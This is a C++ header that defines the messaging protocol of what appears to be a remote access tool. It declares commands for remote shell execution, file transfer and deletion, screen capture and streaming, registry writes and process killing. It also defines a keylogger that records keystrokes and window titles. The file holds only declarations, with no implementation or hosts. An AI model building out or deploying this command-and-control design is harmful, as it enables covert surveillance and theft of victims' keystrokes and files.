#pragma once

#include <string>
#include <map>
#include <vector>
#include <cstdint>

namespace Protocol {
    // Message types
    namespace MessageType {
        constexpr const char* HANDSHAKE = "handshake";
        constexpr const char* HANDSHAKE_RESPONSE = "handshake_response";
        constexpr const char* HEARTBEAT = "heartbeat";
        constexpr const char* HEARTBEAT_RESPONSE = "heartbeat_response";
        constexpr const char* SYSTEM_INFO = "system_info";
        constexpr const char* COMMAND = "command";
        constexpr const char* COMMAND_RESPONSE = "command_response";
        constexpr const char* FILE_REQUEST = "file_request";
        constexpr const char* FILE_RESPONSE = "file_response";
        constexpr const char* FILE_CHUNK = "file_chunk";
        constexpr const char* SCREEN_CAPTURE = "screen_capture";
        constexpr const char* KEYLOG_DATA = "keylog_data";
        constexpr const char* ERROR_MESSAGE = "error";
        constexpr const char* DISCONNECT = "disconnect";
    }
    
    // Command types
    namespace CommandType {
        constexpr const char* SHELL = "shell";
        constexpr const char* FILE_LIST = "file_list";
        constexpr const char* FILE_DOWNLOAD = "file_download";
        constexpr const char* FILE_UPLOAD = "file_upload";
        constexpr const char* FILE_DELETE = "file_delete";
        constexpr const char* FILE_RENAME = "file_rename";
        constexpr const char* SCREEN_CAPTURE = "screen_capture";
        constexpr const char* SCREEN_STREAM_START = "screen_stream_start";
        constexpr const char* SCREEN_STREAM_STOP = "screen_stream_stop";
        constexpr const char* KEYLOG_START = "keylog_start";
        constexpr const char* KEYLOG_STOP = "keylog_stop";
        constexpr const char* KEYLOG_DUMP = "keylog_dump";
        constexpr const char* PROCESS_LIST = "process_list";
        constexpr const char* PROCESS_KILL = "process_kill";
        constexpr const char* REGISTRY_READ = "registry_read";
        constexpr const char* REGISTRY_WRITE = "registry_write";
        constexpr const char* SYSTEM_INFO = "system_info";
        constexpr const char* DISCONNECT = "disconnect";
        constexpr const char* SHUTDOWN = "shutdown";
        constexpr const char* RESTART = "restart";
    }
    
    // Error codes
    namespace ErrorCode {
        constexpr int SUCCESS = 0;
        constexpr int UNKNOWN_ERROR = 1;
        constexpr int INVALID_COMMAND = 2;
        constexpr int COMMAND_FAILED = 3;
        constexpr int FILE_NOT_FOUND = 4;
        constexpr int ACCESS_DENIED = 5;
        constexpr int NETWORK_ERROR = 6;
        constexpr int TIMEOUT = 7;
        constexpr int INVALID_PARAMETERS = 8;
        constexpr int NOT_IMPLEMENTED = 9;
        constexpr int INSUFFICIENT_PRIVILEGES = 10;
    }
    
    // File operation types
    namespace FileOperation {
        const std::string LIST = "list";
        const std::string DOWNLOAD = "download";
        const std::string UPLOAD = "upload";
        const std::string DELETE_OPERATION = "delete";
        const std::string RENAME = "rename";
        const std::string COPY = "copy";
        const std::string MOVE = "move";
        const std::string CREATE_DIR = "create_dir";
        const std::string DELETE_DIR = "delete_dir";
    }
    
    // Screen capture formats
    namespace ScreenFormat {
        const char* const JPEG = "jpeg";
        const char* const PNG = "png";
        const char* const BMP = "bmp";
    }
    
    // Message structure definitions
    struct BaseMessage {
        std::string type;
        std::string timestamp;
        std::string client_id;
    };
    
    struct HandshakeMessage : BaseMessage {
        std::string version;
        std::string client_name;
        std::map<std::string, std::string> capabilities;
    };
    
    struct HeartbeatMessage : BaseMessage {
        int64_t sequence;
    };
    
    struct SystemInfoMessage : BaseMessage {
        std::string os;
        std::string computer_name;
        std::string username;
        std::string cpu;
        std::string memory;
        std::string disk_space;
        std::vector<std::string> network_interfaces;
        std::vector<std::string> running_processes;
    };
    
    struct CommandMessage : BaseMessage {
        std::string command_id;
        std::string command_type;
        std::string command;
        std::map<std::string, std::string> parameters;
    };
    
    struct CommandResponseMessage : BaseMessage {
        std::string command_id;
        bool success;
        int error_code;
        std::string response;
        std::string error_message;
    };
    
    struct FileRequestMessage : BaseMessage {
        std::string request_id;
        std::string operation;
        std::string file_path;
        std::string destination_path;
        int64_t file_size;
        std::map<std::string, std::string> parameters;
    };
    
    struct FileResponseMessage : BaseMessage {
        std::string request_id;
        bool success;
        int error_code;
        std::string error_message;
        std::vector<std::map<std::string, std::string>> file_list;
    };
    
    struct FileChunkMessage : BaseMessage {
        std::string transfer_id;
        int64_t chunk_number;
        int64_t total_chunks;
        std::string data; // Base64 encoded
        bool is_last_chunk;
    };
    
    struct ScreenCaptureMessage : BaseMessage {
        std::string capture_id;
        std::string format;
        int width;
        int height;
        std::string data; // Base64 encoded image data
        bool is_streaming;
    };
    
    struct KeylogDataMessage : BaseMessage {
        std::string session_id;
        std::string window_title;
        std::string keystrokes;
        std::string timestamp_start;
        std::string timestamp_end;
    };
    
    struct ErrorMessage : BaseMessage {
        int error_code;
        std::string error_message;
        std::string context;
    };
    
    // Utility functions for message creation
    std::string CreateHandshakeMessage(const std::string& clientId);
    std::string CreateHeartbeatMessage(const std::string& clientId, int64_t sequence);
    std::string CreateSystemInfoMessage(const std::string& clientId, const std::map<std::string, std::string>& sysInfo);
    std::string CreateCommandResponse(const std::string& clientId, const std::string& commandId, 
                                    bool success, const std::string& response, int errorCode = 0);
    std::string CreateErrorMessage(const std::string& clientId, int errorCode, 
                                 const std::string& errorMessage, const std::string& context = "");
    
    // Message parsing functions
    bool ParseMessage(const std::string& json, BaseMessage& message);
    bool ParseCommandMessage(const std::string& json, CommandMessage& command);
    bool ParseFileRequest(const std::string& json, FileRequestMessage& request);
    
    // Validation functions
    bool ValidateMessage(const std::string& json);
    bool ValidateCommandMessage(const CommandMessage& command);
    
    // Serialization helpers
    std::string SerializeMessage(const BaseMessage& message);
    std::string EncodeBase64(const std::vector<uint8_t>& data);
    std::vector<uint8_t> DecodeBase64(const std::string& encoded);
    
    // Error handling
    std::string GetErrorMessage(int errorCode);
}